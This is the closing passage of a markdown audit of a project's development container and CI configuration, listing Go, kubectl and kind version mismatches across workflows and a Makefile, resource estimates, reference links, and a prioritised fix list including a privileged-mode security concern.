   - GO_VERSION: '1.22.10' ❌
   - PYTHON_VERSION: '3.12' ⚠️ (Minor mismatch)
   - NODE_VERSION: '20' ✅

3. **.github/workflows/docker-build.yml** (INCORRECT - NEEDS UPDATE)
   - GO_VERSION: '1.22.10' ❌
   - Dockerfile: FROM golang:1.22.10-alpine ❌

4. **.github/workflows/dependency-review.yml** (INCORRECT - NEEDS UPDATE)
   - go-version: '1.22.10' ❌
   - node-version: '20' ✅
   - python-version: '3.12' ⚠️

5. **.github/workflows/codeql.yml** (INCORRECT - NEEDS UPDATE)
   - GO_VERSION: '1.22.10' ❌

6. **Makefile** (MOSTLY CORRECT)
   - GO_VERSION := 1.24.7 ✅
   - KIND_VERSION := v0.20.0 ❌ (Older than CI)
   - K3S_VERSION := v1.28.5+k3s1 ✅
   - KUBECTL_VERSION := v1.28.5 ❌ (Older than CI)

### G. Resource Usage Estimates

| Configuration | CPU Usage | Memory Usage | Disk Usage | Initialization Time |
|--------------|-----------|--------------|------------|---------------------|
| Current (universal) | 1-2 cores | 4-6 GB | 12 GB | 5-7 minutes |
| Recommended (go:1.24) | 0.5-1 core | 2-3 GB | 4 GB | 2-3 minutes |
| Optimal (custom) | 0.5-1 core | 1.5-2 GB | 2.5 GB | 1-2 minutes |

**Note:** Resource usage during active development will be similar across all configurations. Differences are primarily during initialization.

### H. Additional Resources

**Documentation:**
- [DevContainer Specification](https://containers.dev/implementors/spec/)
- [VS Code Dev Containers](https://code.visualstudio.com/docs/devcontainers/containers)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
- [Go 1.24 Release Notes](https://go.dev/doc/go1.24)
- [Kubernetes Versions](https://kubernetes.io/releases/)

**Tools:**
- [DevContainer CLI](https://github.com/devcontainers/cli)
- [DevContainer Features](https://github.com/devcontainers/features)
- [Kind Documentation](https://kind.sigs.k8s.io/)
- [Kubebuilder Book](https://book.kubebuilder.io/)

---

## SUMMARY OF CRITICAL ISSUES

### 🔴 CRITICAL (Must Fix Immediately)

1. **Go Version Mismatch** (5 workflows affected)
   - DevContainer: 1.24.7 ✓
   - CI (main): 1.24.7 ✓
   - CI (others): 1.22.10 ❌
   - **Action:** Update all workflows to 1.24.7

2. **Privileged Mode Security Risk**
   - Current: Full privileged access to host
   - **Action:** Switch to docker-outside-of-docker + specific capabilities

3. **Missing Critical Tools**
   - Kubebuilder, setup-envtest, iperf3 not pre-installed
   - **Action:** Add to features or setup script

### ⚠️ HIGH PRIORITY (Fix Within 1 Week)

4. **Bloated Base Image**
   - Current: 12 GB universal image with unnecessary tools
   - **Action:** Switch to 3.5 GB Go base image

5. **Unpinned Tool Versions**
   - kubectl, helm, kind, k3s use "latest"
   - **Action:** Pin all versions to match CI

6. **kubectl/Kind Version Mismatch**
   - Makefile: kubectl 1.28.5, Kind 0.20.0
   - CI: kubectl 1.31.0, Kind 0.23.0
   - **Action:** Standardize to CI versions

### ⚠️ MEDIUM PRIORITY (Fix Within 2 Weeks)

7. **Outdated VS Code Settings**
   - Python linting/formatting settings deprecated
   - YAML schema syntax incorrect
   - **Action:** Update to modern extension API

8. **Missing Developer Extensions**
   - No Makefile tools, Go test explorer, coverage gutters
   - **Action:** Add essential extensions

9. **Redundant Tool Installation**
   - bootstrap.sh and make setup both install tools
   - **Action:** Consolidate into single setup script

### 📊 ESTIMATED IMPACT

**Implementation Time:** 2-3 days
**Performance Improvement:** 80% faster initialization
**Storage Savings:** 8.5 GB per developer
**Security Improvement:** Eliminates critical container escape risk
**Developer Experience:** Consistent environment across all workflows

---

**End of Analysis**